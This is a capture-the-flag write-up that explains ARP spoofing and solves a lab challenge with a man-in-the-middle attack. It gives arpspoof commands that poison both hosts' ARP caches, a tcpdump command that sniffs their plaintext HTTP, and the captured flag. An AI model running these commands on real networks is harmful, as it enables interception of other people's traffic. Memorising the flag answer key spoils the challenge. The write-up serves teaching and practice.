---
CTF: nns-ctf-2026
Category: devsecops
Points: "61"
Date: 2026-09-06
Solved?: true
---
----
[<- Home](../../)
### TL;DR

**Flag**

```
NNS{sWitcHeD_N37w0rk5_s7i11_7Rus7_arp_5o_keep_Your_DeV1c3s_53par473}
```

A client `10.10.10.20` periodically fetches something over HTTP from a server at `10.10.10.10`. Were a third host (`10.10.10.66`) with `arpspoof` and `tcpdump`. Poison both sides' ARP caches so their traffic flows through "attacker", sniff it, and read the flag out of the HTTP response. 
### Details

**Description:** I'm on your network. There is a client at `10.10.10.20` that keeps fetching something from the web server at `10.10.10.10`, and the server only talks to the client.

You are `10.10.10.66`. You have `arpspoof` and `tcpdump`.

**Author:** 0xle

**Files:** -

## How it works

The setup exploits ARP weakness. On a local network, hosts talk to each other by MAC address. To find the MAC behind an IP, a host broadcasts "who has 10.10.10.10?" and caches whatever reply comes back. 

ARP has no authentication. A host accepts ARP replies it never asked for, and overwrites its cache with the latest one. So an attacker send crafted replies claiming "10.10.10.10 is me" and the victims believes it.

By poisoning both sides we insert ourselves in the middle:

```
             normal:
   client 10.10.10.20  <----------->  server 10.10.10.10

             after poisoning:
   client  --"server is at 02:...:66"-->  attacker 10.10.10.66
   server  --"client is at 02:...:66"-->  attacker 10.10.10.66

   client 10.10.10.20  --->  attacker  --->  server 10.10.10.10
                       <---            <---
```

- Tell the client that `10.10.10.10` (the server) is at our MAC
- Tell the server that `10.10.10.20` (the client) is at our MAC

So now both send their frames to us. Because the traffic is plain HTTP, once its passes through us we can read it in and get the flag in the HTTP response body.
## Solution

### Step 0. Env notes

Connecting to the instance drops you into a minimal container as `10.10.10.66`. No `ps`, `sysctl` and  `/proc/sys/net/ipv4/ip_forward`  is readonly. 

Normally you'd enable forwarding so the victims' connection survives the MITM. Here you can't... but it doesn't matter tho. The client re-fetches on a loop, so we just need to capture one request. 

### Step 1. Connecting to the endpoint

```bash
openssl s_client -connect hiding-in-your-wifi-4ad8c480900a.chall.nnsc.tf:1337 -quiet
```

**Step 2.** find the interface

```bash
ip a
```

```
3: eth0@if3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 8951 ...
    link/ether 02:00:00:00:00:66 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.10.10.66/24 scope global eth0
```

Interface is `eth0`, our MAC is `02:00:00:00:00:66`, confirming we're `.66`.

### Step 3. Poison both directions

Both `arpspoof` procs must run at the same time, in separate shells. 

Shell A: tell the client that the server is at our MAC
```bash
arpspoof -i eth0 -t 10.10.10.20 10.10.10.10
```

Shell B: tell the server that the client is at our MAC 
```bash
arpspoof -i eth0 -t 10.10.10.10 10.10.10.20
```


### Step 4. Sniff the traffic

In a third shell, capture only the traffic between the two victims and dump ASCII payloads.

```
tcpdump -i eth0 -A host 10.10.10.20 and host 10.10.10.10
```
- `-A`: print packet payloads in ASCII
- `host X and host Y`: filter to just the client <-> server conv.

### Step 5. Read the flag

The next time the client fetches, its request now routes through us and the server's response is captured: 

```bash
KHTTP/1.1 200 OK
Server: nginx
Date: Sun, 06 Sep 2026 11:58:51 GMT
Content-Type: text/plain
Content-Length: 68
...

NNS{sWitcHeD_N37w0rk5_s7i11_7Rus7_arp_5o_keep_Your_DeV1c3s_53par473}
```
